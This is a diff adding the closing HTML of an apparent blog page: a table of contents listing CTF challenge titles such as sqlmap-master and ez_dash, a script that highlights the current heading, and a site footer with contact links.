+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#sqlmap-master">sqlmap-master</a></li>
+    <li><a href="#ez_dash复现">ez_dash(复现)</a></li>
+    <li><a href="#ez_dash_revenge复现">ez_dash_revenge(复现)</a></li>
+    <li><a href="#h2-revenge暂未复现">H2 Revenge(暂未复现)</a></li>
+    <li><a href="#internal_api暂未复现">internal_api(暂未复现)</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/174b8aca6bb8ac8a7b3566419fda9873.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
